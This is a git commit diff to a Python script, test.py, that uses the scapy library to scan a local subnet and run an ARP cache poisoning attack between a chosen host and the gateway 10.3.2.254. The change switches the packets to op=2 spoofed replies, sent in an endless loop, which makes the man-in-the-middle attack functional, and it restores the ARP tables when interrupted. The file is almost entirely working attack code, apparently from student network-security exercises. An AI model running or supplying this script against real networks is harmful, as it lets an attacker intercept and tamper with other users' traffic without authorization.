782a62728087d4d4cace9aeac6fe35e37d01ac38
LeSam0 <samy.durand@ynov.com>
2022-11-29 11:40:31 +0100

    caramel et

--- test.py
+++ test.py
@@ -1,44 +1,41 @@
 from scapy.layers.l2 import *
-from scapy.sendrecv import sr
-
-result = []
+from scapy.sendrecv import send
 
 def spoofarpcache(targetip, targetmac, sourceip):
-    spoofed= ARP(op=ARP.who_has , pdst=targetip, psrc=sourceip, hwdst= targetmac)
-    result.append(sr(spoofed, verbose= False))
+	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
+	send(spoofed, verbose= False)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
-    packet= ARP(op=ARP.who_has , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
-    result.append(sr(packet, verbose=False))
-    print("ARP Table restored to normal for", targetip)
+	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
+	send(packet, verbose=False)
+	print("ARP Table restored to normal for", targetip)
 
 def MultiSniffing():
-    ipt = {}
-    ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
-    for num in range(1, 254):
-        if str(arping(ip + str(num))[0])[-2] != "0":
-            ipt[ip + str(num)] = getmacbyip(ip + str(num))
-    print(ipt)
+	ipt = {}
+	ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
+	for num in range(1, 254):
+		if str(arping(ip + str(num))[0])[-2] != "0":
+			ipt[ip + str(num)] = getmacbyip(ip + str(num))
+	print(ipt)
 
 
 def SingleSniffing(targetip):
-    if str(arping(targetip)[0])[-2] != "0" :
-        targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
-        gatewayip = "10.3.2.254"  #conf.route.route(targetip)[2]
-        gatewaymac = getmacbyip(conf.route.route("10.3.2.254")[2])
-        try:
-            print("Sending spoofed ARP responses")
-            while True:
-                spoofarpcache(targetip, targetmac, gatewayip)
-                spoofarpcache(gatewayip, gatewaymac, targetip)
-        except KeyboardInterrupt:
-            print("ARP spoofing stopped")
-            restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
-            restorearp(targetip, targetmac, gatewayip, gatewaymac)
-            print(result)
-            quit()
-    else:
-        print("Ip not reachable")
+	if str(arping(targetip)[0])[-2] != "0" :
+		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
+		gatewayip = "10.3.2.254"  #conf.route.route(targetip)[2]
+		gatewaymac = getmacbyip(conf.route.route("10.3.2.254")[2])
+		try:
+			print("Sending spoofed ARP responses")
+			while True:
+				spoofarpcache(targetip, targetmac, gatewayip)
+				spoofarpcache(gatewayip, gatewaymac, targetip)
+		except KeyboardInterrupt:
+			print("ARP spoofing stopped")
+			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
+			restorearp(targetip, targetmac, gatewayip, gatewaymac)
+			quit()
+	else:
+		print("Ip not reachable")
 
 
 SingleSniffing(input("Which ip : "))
